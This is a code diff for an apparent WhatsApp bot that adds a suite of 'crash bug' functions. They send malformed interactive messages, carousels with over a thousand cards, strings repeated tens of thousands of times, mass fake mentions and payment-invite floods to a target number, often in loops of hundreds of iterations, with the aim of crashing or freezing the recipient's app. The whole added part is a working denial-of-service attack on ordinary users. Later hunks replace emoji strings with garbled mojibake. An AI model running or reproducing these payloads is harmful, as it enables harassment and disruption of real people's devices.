@@ -24,7 +24,751 @@ const {
 
 const crypto = require('crypto')
 let client;
+// ===================== Bug Functions =====================
 
+
+async function carousels2(target, fJids) {
+  const cards = [];
+
+  const media = await prepareWAMessageMedia(
+    { image: imgCrL },
+    { upload: rich.waUploadToServer }
+  );
+
+  const header = proto.Message.InteractiveMessage.Header.fromObject({
+    imageMessage: media.imageMessage,
+    title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
+    gifPlayback: false,
+    subtitle: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞͞⃟⏤͟͟͞͞͠🩸✦',
+    hasMediaAttachment: true
+  });
+
+  for (let r = 0; r < 1000; r++) {
+    cards.push({
+      header,
+      body: {
+        text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
+      },
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "cta_url",
+            buttonParamsJson: JSON.stringify({
+              display_text: "view",
+              url: "https://example.com"
+            })
+          }
+        ]
+      }
+    });
+  }
+
+  const msg = generateWAMessageFromContent(
+    isTarget,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
+            },
+            footer: {
+              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
+            },
+            carouselMessage: {
+              cards,
+              messageVersion: 1
+            }
+          }
+        }
+      }
+    },
+    {}
+  );
+  
+  await rich.relayMessage(
+    target,
+    msg.message,
+    fJids
+      ? { participant: { jid: target, messageId: null } }
+      : {}
+  );
+  console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉")
+}
+
+async function Loc(target, amount, jids) {
+let pesan = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+header: {
+title: "",
+locationMessage: {},
+hasMediaAttachment: true
+},
+body: {
+text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
+},
+nativeFlowMessage: {
+buttons: [
+{
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}, {
+name: "single_select",
+buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
+}
+]
+}
+}
+},
+carouselMessage: {
+cards: []
+}
+}
+}), {
+userJid: target,
+quoted: null
+});
+
+await rich.relayMessage(isTarget, pesan.message, jids ? {
+participant: { jid: isTarget }
+} : {});
+console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉")
+}
+async function thunderblast_ios1(target) {
+    const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
+    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+                            mimetype: "application/json",
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999999",
+                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: fileName,
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+                            mediaKeyTimestamp: "1715880173"
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: { text: bodyText },
+                    nativeFlowMessage: {
+                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🚀","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
+                    },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
+                    }
+                }
+            }
+        }
+    }), { userJid: target });
+
+    const msg1 = await genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
+    await rich.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });
+
+    const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
+    await rich.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });
+
+    await rich.relayMessage(target, {
+        locationMessage: {
+            degreesLatitude: 173.282,
+            degreesLongitude: -19.378,
+            name: TravaIphone,
+            url: "https://youtube.com/@ShinZ.00"
+        }
+    }, { participant: { jid: target } });
+
+await rich.relayMessage(target, {
+        'extendedTextMessage': {
+            'text': TravaIphone,
+            'contextInfo': {
+                'stanzaId': target,
+                'participant': target,
+                'quotedMessage': {
+                    'conversation': 'UNDEFINEDONTOP↕️' + 'ꦾ'.repeat(50000)
+                },
+                'disappearingMode': {
+                    'initiator': "CHANGED_IN_CHAT",
+                    'trigger': "CHAT_SETTING"
+                }
+            },
+            'inviteLinkGroupTypeV2': "DEFAULT"
+        }
+    }, {
+        'participant': {
+            'jid': target
+        }
+    }, {
+        'messageId': null
+    });
+
+    const paymentMsg = service => ({
+    paymentInviteMessage: {
+        serviceType: service,
+        expiryTimestamp: Date.now() + 91814400000,
+        maxTransactionAmount: 10000000000,
+        maxDailyTransaction: 100000000000,
+        maxTransactionFrequency: 1,
+        secureMode: true,
+        verificationRequired: true,
+        antiFraudProtection: true,
+        multiFactorAuthentication: true,
+        transactionLogging: true,
+        geoLock: true,
+        sessionTimeout: 300000,
+        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
+        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
+        transactionRateLimit: 3,
+        realTimeFraudDetection: true,
+        dailyLimitResetTime: "00:00",
+        fullAuditTrail: true,
+        userBehaviorAnalysis: true,
+        transactionNotification: true,
+        dynamicSessionTokens: true,
+        deviceFingerprinting: true,
+        transactionEncryption: true,
+        encryptedMsgID: generateEncryptedID(service)
+    }
+});
+
+function generateEncryptedID(service) {
+    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
+}
+
+for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "SAMSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
+    await rich.relayMessage(target, paymentMsg(service), {
+        participant: { jid: target },
+        timestamp: Date.now(),
+        requestID: generateEncryptedID(service),
+    });
+}
+    
+    await rich.relayMessage(target, {
+        locationMessage: {
+            degreesLatitude: 173.282,
+            degreesLongitude: -19.378,
+            name: "😘" + TravaIphone,
+            url: "https://youtube.com/@ShinZ.00"
+        }
+    }, { participant: { jid: target } });
+    
+    await rich.relayMessage(target, {
+        locationMessage: {
+            degreesLatitude: 173.282,
+            degreesLongitude: -19.378,
+            name: "😘" + TravaIphone,
+            url: "https://youtube.com/@qioaje"
+        }
+    }, { participant: { jid: target } });
+}
+async function callHome(target, ptcp = true) {
+let conf = {}
+if (ptcp === true) {
+    conf = {
+        "participant": {
+            "jid": target
+        }
+    }
+}
+rich.relayMessage(target, {
+"viewOnceMessage": {
+"message": {
+"interactiveMessage": {
+    "header": {
+        "hasMediaAttachment": false
+    },
+    "body": {
+        "text": "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦"
+    },
+    "nativeFlowMessage": {
+        "buttons": [
+            {
+                "name": "cta_call",
+                "buttonParamsJson": JSON.stringify({
+                    "status": "𛀠"
+                })
+            },
+// it crashes because status is not EXPIRED ore CALL_COMPLETED
+            {
+                "name": "call_permission_request",
+                "buttonParamsJson": ""
+            }
+        ],
+        "messageParamsJson": ""
+    }
+}
+}
+}
+},conf)
+}
+async function CarouselX(target) {
+for (let i = 0; i < 1020; i++) {
+try {
+        let push = [];
+
+        // Generate 1000 cards
+        for (let i = 0; i < 1020; i++) {
+            push.push({
+                body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
+                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
+                header: proto.Message.InteractiveMessage.Header.fromObject({
+                    title: '⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦',
+                    hasMediaAttachment: true,
+                    imageMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+                        mimetype: "image/jpeg",
+                        fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
+                        fileLength: "10840",
+                        height: 10,
+                        width: 10,
+                        mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
+                        fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
+                        directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
+                        mediaKeyTimestamp: "1721344123",
+                        jpegThumbnail: ""
+                    }
+                }),
+                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
+            });
+        }
+        
+        const carousel = generateWAMessageFromContent(
+            targetJID, 
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000` }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "`YT:` https://youtube.com/@richieMods" }),
+                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
+                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
+                        })
+                    }
+                }
+            }, 
+            {}
+        );
+
+        await rich.relayMessage(targetJID, carousel.message, {
+            participant: { jid: targetJID },
+        });
+
+    } catch (err) {
+        console.error("Error in Fkod:", err);
+    }
+}
+}
+
+async function KingDelayMess(target, Ptcp = true) {
+  await rich.relayMessage(target, {
+    ephemeralMessage: {
+      message: {
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          header: {
+            documentMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+              fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
+              fileLength: 9999999999999,
+              pageCount: 1316134911,
+              mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
+              fileName: "kingbadboi.𝐜𝐨𝐦",
+              fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
+              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+              mediaKeyTimestamp: 1726867151,
+              contactVcard: true
+            },
+            hasMediaAttachment: true
+          },
+          body: {
+            text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦\n" + "@15056662003".repeat(1000)
+          },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "cta_url",
+                buttonParamsJson: JSON.stringify({
+                  display_text: "Iqbhalkeifer",
+                  url: "https://youtube.com/@iqbhalkeifer25",
+                  merchant_url: "https://youtube.com/@iqbhalkeifer25"
+                })
+              },
+              {
+                name: "call_permission_request",
+                buttonParamsJson: "{}"
+              }
+            ],
+            messageParamsJson: "{}"
+          },
+          contextInfo: {
+            mentionedJid: [
+              "15056662003@s.whatsapp.net",
+              ...Array.from({ length: 50 }, () => `${Math.floor(Math.random() * 9000000000) + 1000000000}@s.whatsapp.net`)
+            ],
+            forwardingScore: 1,
+            isForwarded: true,
+            fromMe: false,
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            quotedMessage: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
+                fileLength: 9999999999999,
+                pageCount: 1316134911,
+                mediaKey: Buffer.from("lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=", "base64"),
+                fileName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
+                fileEncSha256: Buffer.from("wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=", "base64"),
+                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                mediaKeyTimestamp: 1724474503,
+                contactVcard: true
+              }
+            }
+          }
+        })
+      }
+    }
+  }, Ptcp ? { participant: target } : {});
+}
+async function KingBroadcast(target, mention = true) { // Default true biar otomatis nyala
+    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
+        title: "᭡꧈".repeat(95000),
+        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
+    }));
+
+    const MSG = {
+        viewOnceMessage: {
+            message: {
+                listResponseMessage: {
+                    title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
+                    listType: 2,
+                    buttonText: null,
+                    sections: delaymention,
+                    singleSelectReply: { selectedRowId: "🔴" },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 30000 }, () => 
+                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                        ),
+                        participant: target,
+                        remoteJid: "status@broadcast",
+                        forwardingScore: 9741,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "333333333333@newsletter",
+                            serverMessageId: 1,
+                            newsletterName: "-"
+                        }
+                    },
+                    description: "richie is him"
+                }
+            }
+        },
+        contextInfo: {
+            channelMessage: true,
+            statusAttributionType: 2
+        }
+    };
+
+    const msg = generateWAMessageFromContent(target, MSG, {});
+
+    await rich.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    // **Cek apakah mention true sebelum menjalankan relayMessage**
+    if (mention) {
+        await rich.relayMessage(
+            target,
+            {
+                statusMentionMessage: {
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25
+                        }
+                    }
+                }
+            },
+            {
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: { is_status_mention: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" },
+                        content: undefined
+                    }
+                ]
+            }
+        );
+    }
+}
+async function DelayInvisNew(target) {
+  const payload = {
+    key: {
+      remoteJid: target,
+      fromMe: false,
+      id: "Qw"
+    },
+    message: {
+      extendedTextMessage: {
+        text: "\u2060", 
+        matchedText: "\u2060",
+        canonicalUrl: "https://t.me/DevRaizel",
+        title: "𝐑𝐀𝐈𝐙𝐄𝐋",
+        description: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
+        jpegThumbnail: "https://files.catbox.moe/aanan8.jpg",
+        contextInfo: {
+          externalAdReply: {
+            showAdAttribution: true,
+            mediaType: 1,
+            previewType: "DOCUMENT",
+            title: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
+            thumbnailUrl: "https://files.catbox.moe/aanan8.jpg",
+            sourceUrl: "https://t.me/DevRaizel"
+          },
+          forwardingScore: 999,
+          isForwarded: true,
+          quotedMessage: {
+            documentMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+              fileLength: "9999999999999",
+              pageCount: 1316134911,
+              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+              fileName: "Dimzxzzx",
+              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+              mediaKeyTimestamp: 1726867151,
+              contactVcard: true,
+              jpegThumbnail: "https://files.catbox.moe/aanan8.jpg"
+            }
+          }
+        }
+      }
+    }
+  };
+
+  await rich.relayMessage(target, payload.message, { messageId: payload.key.id });
+}
+
+async function superdelayinvid(target) {
+  return {
+    key: {
+      remoteJid: target,
+      fromMe: false,
+      id: "BAE538D8B0529FB7",
+    },
+    message: {
+      extendedTextMessage: {
+        text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
+        contextInfo: {
+          participant: "13135550002@s.whatsapp.net",
+          quotedMessage: {
+            extendedTextMessage: {
+              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
+            },
+          },
+          remoteJid: "status@broadcast"
+        },
+      },
+    },
+    messageTimestamp: Math.floor(Date.now() / 1000),
+    broadcast: true,
+    pushName:  "2709",
+  };
+}
+async function delayCrash(target, mention = false, delayMs = 500) {
+    for (const targett of target) {
+        const generateMessage = {
+            viewOnceMessage: {
+                message: {
+                    imageMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+                        mimetype: "image/jpeg",
+                        caption: "? ???????-?",
+                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+                        fileLength: "19769",
+                        height: 354,
+                        width: 783,
+                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
+                        mediaKeyTimestamp: "1743225419",
+                        jpegThumbnail: null,
+                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
+                        scanLengths: [2437, 17332],
+                        contextInfo: {
+                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+                            isSampled: true,
+                            participant: target,
+                            remoteJid: "status@broadcast",
+                            forwardingScore: 9741,
+                            isForwarded: true
+                        }
+                    }
+                }
+            }
+        };
+
+        const msg = generateWAMessageFromContent(target, generateMessage, {});
+        
+        await rich.relayMessage("status@broadcast", msg.message, {
+            messageId: msg.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                    content: undefined
+                                }
+                            ]
+                        }
+                    ]
+                }
+            ]
+        });
+
+        if (mention) {
+            await rich.relayMessage(
+                target,
+                {
+                    statusMentionMessage: {
+                        message: {
+                            protocolMessage: {
+                                key: msg.key,
+                                type: 25
+                            }
+                        }
+                    }
+                },
+                {
+                    additionalNodes: [
+                        {
+                            tag: "meta",
+                            attrs: { is_status_mention: "???? ???????? - ????" },
+                            content: undefined
+                        }
+                    ]
+                }
+            );
+        }
+
+        // Delay antar target
+        await new Promise(res => setTimeout(res, delayMs));
+    }
+}
+
+async function alldelay(target) {
+    const start = Date.now(); // Record start time
+
+    for (let i = 0; i <= 900; i++) { 
+        await DelayInvisNew(target);   
+        await superdelayinvid(target); 
+        await delayCrash(target, mention = false);                
+        await KingBroadcast(target, mention = true);
+     await DelayInvisNew(target);   
+        await superdelayinvid(target); 
+        await delayCrash(target, mention = false);                
+        await KingBroadcast(target, mention = true);  
+        await DelayInvisNew(target);   
+        await superdelayinvid(target); 
+        await delayCrash(target, mention = false);                
+        await KingBroadcast(target, mention = true); 
+        await KingDelayMess(target, Ptcp = true);
+    }
+
+    const end = Date.now(); // Record end time
+    const seconds = ((end - start) / 1000).toFixed(2);
+
+    console.log(`✅ alldelay finished for: ${target} in ${seconds}s`);
+}
+async function apaya(rich, target) {
+            try {
+                const messsage = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: '33333333333333333@newsletter',
+                                newsletterName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" + "ꦾ".repeat(120000),
+                                jpegThumbnail: global.thumb,
+                                caption: "ꦽ".repeat(120000),
+                                inviteExpiration: Date.now() + 1814400000,
+                            },
+                        },
+                    },
+                };
+                await rich.relayMessage(target, messsage, {
+                    userJid: target,
+                });
+            }
+            catch (err) {
+                console.log(err);
+            }
+        }
 async function bulldozer(client, target) {
   let message = {
     viewOnceMessage: {
@@ -104,7 +848,7 @@ async function bulldozer(client, target) {
 
 async function protocolbug1(rich, target, mention) {
 const delaymention = Array.from({ length: 9741 }, (_, r) => ({
-title: "�?".repeat(9741),
+title: "á­?".repeat(9741),
 rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
 }));
 
@@ -112,11 +856,11 @@ const MSG = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
+title: "ðŸ©¸ ð‘Í ð¢Ì»ð³Í¢ð±Í¯ð•Ì»ðžÍœð¥Ì»ð³Í¡ ðŽÍ ðŸÌ»ðŸÍ¢ð¢ÍœðœÍ¯ð¢Ì»ðšÌ»ð¥-ðˆÍ¯ðƒ",
 listType: 2,
 buttonText: null,
 sections: delaymention,
-singleSelectReply: { selectedRowId: "🌀" },
+singleSelectReply: { selectedRowId: "ðŸŒ€" },
 contextInfo: {
 mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
 participant: target,
@@ -182,7 +926,7 @@ type: 25
 additionalNodes: [
 {
 tag: "meta",
-attrs: { is_status_mention: "🌀 𝗥𝗶𝘇𝘅𝘃𝗲𝗹𝘇 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
+attrs: { is_status_mention: "ðŸŒ€ ð—¥ð—¶ð˜‡ð˜…ð˜ƒð—²ð—¹ð˜‡ - ð—§ð—¿ð—®ð˜€ð—µ ð—£ð—¿ð—¼ð˜ð—¼ð—°ð—¼ð—¹" },
 content: undefined
 }
 ]
@@ -381,7 +1125,7 @@ async function protocolbug8(rich, target, mention) {
     const embeddedMusic = {
         musicContentMediaId: "589608164114571",
         songId: "870166291800508",
-        author: ".Rizxvelz Official" + "ោ៝".repeat(10000),
+        author: ".Rizxvelz Official" + "áŸ„áŸ".repeat(10000),
         title: "Zoro",
         artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
         artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
@@ -541,7 +1285,7 @@ async function protocolbug6(rich, target, mention) {
           additionalNodes: [
             {
               tag: "meta",
-              attrs: { is_status_mention: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" },
+              attrs: { is_status_mention: "ðŸ©¸ ð‘Í ð¢Ì»ð³Í¢ð±Í¯ð•Ì»ðžÍœð¥Ì»ð³Í¡ ðŽÍ ðŸÌ»ðŸÍ¢ð¢ÍœðœÍ¯ð¢Ì»ðšÌ»ð¥-ðˆÍ¯ðƒ" },
               content: undefined
             }
           ]
@@ -575,7 +1319,7 @@ async function protocolbug7(rich, target, mention) {
     forwardedNewsletterMessageInfo: {
       newsletterJid: "1@newsletter",
       serverMessageId: 1,
-      newsletterName: "�?".repeat(99)
+      newsletterName: "ê¦?".repeat(99)
     }
   };
 
